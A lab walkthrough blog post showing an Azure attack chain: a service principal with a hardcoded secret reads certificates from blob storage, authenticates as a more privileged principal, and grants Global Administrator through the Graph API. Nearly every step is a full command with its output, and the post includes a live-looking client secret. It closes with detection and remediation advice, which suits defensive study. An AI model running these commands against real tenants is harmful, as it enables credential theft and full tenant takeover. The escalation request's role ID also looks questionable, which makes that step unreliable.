---
title: "BadZure: Storage Certificate Theft via Service Principal"
date: 2026-05-14 00:02:00 +0000
categories: [Azure, Pentesting]
tags: [azure, storage, certificate-theft, badzure, managed-identity, service-principal]
---

## Overview

**Technique:** SP with Storage Blob Data Reader → Certificate Download → SP Authentication  
**Initial Access:** TerraMoverPro service principal (hardcoded credentials)  
**Outcome:** Authenticated as VertexAgentPort → AppRoleAssignment.ReadWrite.All → Tenant Owned  
**Environment:** BadZure lab  

---

## Attack Chain

```
TerraMoverPro SP credentials
        ↓
Storage Blob Data Reader on marketingassetssa82k
        ↓
List containers → cert-container-storage-theft-sp-nmr7kq
        ↓
Download VertexAgentPort cert + private key
        ↓
Combine PEM → authenticate as VertexAgentPort
        ↓
AppRoleAssignment.ReadWrite.All → assign Global Administrator
        ↓
Tenant Owned
```

---

## Step 1 - Initial Access

TerraMoverPro SP credentials obtained via BadZure:

```bash
PS C:\users\flare\desktop\azure> az login --service-principal -u a16997f7-d83e-4584-81db-baf2dfa75790 -p 'APm8Q~DOAkwdUFg7oJzB1AOFfzsoEqbNKuABrdsW' --tenant 97b...
[
  {
    "cloudName": "AzureCloud",
    "homeTenantId": "97b...",
    "id": "035...",
    "isDefault": true,
    "managedByTenants": [],
    "name": "Azure subscription 1",
    "state": "Enabled",
    "tenantId": "97b...",
    "user": {
      "name": "a16997f7-d83e-4584-81db-baf2dfa75790",
      "type": "servicePrincipal"
    }
  }
]
```

---

## Step 2 - Storage Enumeration

An **Azure Storage Account** is a unique namespace in the Azure cloud that serves as a container for all Azure Storage data objects, including **Blob storage**, **Azure Files**, **Queues**, and **Tables**.

I list accessible storage accounts

```powershell
PS C:\users\flare\desktop\azure> az storage account list --query "[].{Name:name, RG:resourceGroup, PublicBlob:allowBlobPublicAccess}" --output table
Name                  RG                    PublicBlob
--------------------  --------------------  ------------
fcqueuehandlerx5mn    Internal-Apps-RG      False
iotsecuritydatasavnl  IT-Infrastructure-RG  False
marketingassetssa82k  Internal-Apps-RG      False
```

Found `marketingassetssa82k` the target in `Internal-Apps-RG`. Next list the containers:

```bash
PS C:\users\flare\desktop\azure> az storage container list --account-name marketingassetssa82k --auth-mode login --output table
Name                                    Lease Status    Last Modified
--------------------------------------  --------------  -------------------------
cert-container-storage-theft-sp-nmr7kq                  2026-05-14T05:10:19+00:00
```

Container: `cert-container-storage-theft-sp-nmr7kq`

Listed blobs:

```bash
PS C:\users\flare\desktop\azure> az storage blob list --account-name marketingassetssa82k --container-name cert-container-storage-theft-sp-nmr7kq --auth-mode login --output table
Name                             Blob Type    Blob Tier    Length    Content Type              Last Modified              Snapshot
-------------------------------  -----------  -----------  --------  ------------------------  -------------------------  ----------
VertexAgentPort-certificate.pem  BlockBlob    Hot          1013      application/octet-stream  2026-05-14T05:14:04+00:00
VertexAgentPort-certificate.pfx  BlockBlob    Hot          2290      application/octet-stream  2026-05-14T05:14:04+00:00
VertexAgentPort-private-key.key  BlockBlob    Hot          1675      application/octet-stream  2026-05-14T05:14:04+00:00
```

Three files found:
- `VertexAgentPort-certificate.pem`
- `VertexAgentPort-certificate.pfx`
- `VertexAgentPort-private-key.key`

---

## Step 3 - Certificate Download

Downloaded all three files:

```powershell
PS C:\users\flare\desktop\azure> az storage blob download --account-name marketingassetssa82k --container-name cert-container-storage-theft-sp-nmr7kq --name VertexAgentPort-certificate.pem --file VertexAgentPort-certificate.pem --auth-mode login

PS C:\users\flare\desktop\azure> az storage blob download --account-name marketingassetssa82k --container-name cert-container-storage-theft-sp-nmr7kq --name VertexAgentPort-certificate.pfx --file VertexAgentPort-certificate.pfx --auth-mode login


PS C:\users\flare\desktop\azure> az storage blob download --account-name marketingassetssa82k --container-name cert-container-storage-theft-sp-nmr7kq --name VertexAgentPort-private-key.key --file VertexAgentPort-private-key.key --auth-mode login
```

Transferred to Kali and combined into a single PEM:

```powershell
 openssl pkcs12 -in VertexAgentPort-certificate.pfx -nocerts -nodes -out private.key -passin pass:

```

```powershell
cat VertexAgentPort-certificate.pem VertexAgentPort-private-key.key > combined.pem
```

---

## Step 4 - Authenticate as VertexAgentPort

```bash
PS C:\users\flare\desktop\azure> az login --service-principal  -u "d9e0410b-c805-4ad9-9184-40d5557a6eba"  --certificate combined.pem  --tenant "97b078......aaf6dea3"  --allow-no-subscriptions
[
  {
    "cloudName": "AzureCloud",
    "id": "97b...",
    "isDefault": true,
    "name": "N/A(tenant level account)",
    "state": "Enabled",
    "tenantId": "97b078c......4aaf6dea3",
    "user": {
      "name": "d9e0410b-c805-4ad9-9184-40d5557a6eba",
      "type": "servicePrincipal"
    }
  }
]
```

Checked Graph app role assignments:

```bash
PS C:\users\flare\desktop\azure> az rest --method GET --url https://graph.microsoft.com/v1.0/servicePrincipals/2887ee61-a9d3-433c-a22c-8418b885ea8c/appRoleAssignments
{
  "@odata.context": "https://graph.microsoft.com/v1.0/$metadata#appRoleAssignments",
  "value": [
    {
      "appRoleId": "798ee544-9d2d-430c-a058-570e29e34338",
      "createdDateTime": "2026-05-14T05:08:29.9034849Z",
      "deletedDateTime": null,
      "id": "Ye6HKNOpPEOiLIQYuIXqjFttYXFxQnxHvMYzWCdYF2c",
      "principalDisplayName": "VertexAgentPort",
      "principalId": "2887ee61-a9d3-433c-a22c-8418b885ea8c",
      "principalType": "ServicePrincipal",
      "resourceDisplayName": "Microsoft Graph",
      "resourceId": "216e59bf-6c38-42b9-9211-734fe4d2f3bb"
    },
    {
      "appRoleId": "19dbc75e-c2e2-444c-a770-ec69d8559fc7",
      "createdDateTime": "2026-05-14T05:08:27.9144042Z",
      "deletedDateTime": null,
      "id": "Ye6HKNOpPEOiLIQYuIXqjG19_Vov8LJMrNcboyG1xcg",
      "principalDisplayName": "VertexAgentPort",
      "principalId": "2887ee61-a9d3-433c-a22c-8418b885ea8c",
      "principalType": "ServicePrincipal",
      "resourceDisplayName": "Microsoft Graph",
      "resourceId": "216e59bf-6c38-42b9-9211-734fe4d2f3bb"
    },
    {
      "appRoleId": "06b708a9-e830-4db3-a914-8e69da51d44f",
      "createdDateTime": "2026-05-14T05:08:27.9113537Z",
      "deletedDateTime": null,
      "id": "Ye6HKNOpPEOiLIQYuIXqjAwedJ0P--NKjphR9w5-_xs",
      "principalDisplayName": "VertexAgentPort",
      "principalId": "2887ee61-a9d3-433c-a22c-8418b885ea8c",
      "principalType": "ServicePrincipal",
      "resourceDisplayName": "Microsoft Graph",
      "resourceId": "216e59bf-6c38-42b9-9211-734fe4d2f3bb"
    }
  ]
}
```

VertexAgentPort has:
- `AppRoleAssignment.ReadWrite.All` (`06b708a9`) — assign any Graph role to any principal
- `Directory.Read.All` (`19dbc75e`)
- `Directory.ReadWrite.All` (`798ee544`)

---

## Step 5 - Escalation to Global Administrator

```powershell
$body = @{
    principalId = "<target-object-id>"
    resourceId  = "216e59bf-6c38-42b9-9211-734fe4d2f3bb"
    appRoleId   = "62e90394-69f5-4237-9190-012177145e10"
} | ConvertTo-Json

az rest --method POST `
  --url "https://graph.microsoft.com/v1.0/servicePrincipals/216e59bf-6c38-42b9-9211-734fe4d2f3bb/appRoleAssignedTo" `
  --headers "Content-Type=application/json" `
  --body $body
```

Tenant owned.

---

## SP vs User Storage Theft

The user variant starts from a compromised user with Storage Blob Data Reader. The SP variant starts from a compromised SP with the same access. The blob download and cert authentication steps are identical  the difference is only the initial access vector. SP credentials are more commonly found hardcoded in scripts, CI/CD pipelines, and environment variables than user credentials which require phishing or password spray.

---

## Key Takeaways

**Why this works:**
- Certificates in blob storage require no additional secret beyond the cert and private key  once downloaded authentication is straightforward
- `AppRoleAssignment.ReadWrite.All` is a tenant takeover primitive  any SP holding it can assign Global Administrator to itself or any other principal
- SP credentials in automation scripts are a common real-world finding  they are often never rotated and carry elevated permissions

**Detection opportunities:**
- Blob downloads from containers with certificate naming patterns
- SP certificate-based authentications from inactive or rarely-used SPs
- `AppRoleAssignment.ReadWrite.All` granted to non-admin SPs
- New Global Administrator assignments by unexpected principals

**Remediation:**
- Store certificates in Key Vault, never in blob storage
- Rotate SP credentials regularly and audit certificate credentials across all SPs
- Restrict `AppRoleAssignment.ReadWrite.All`, treat it as a tenant admin permission
- Alert on blob downloads from sensitive storage containers
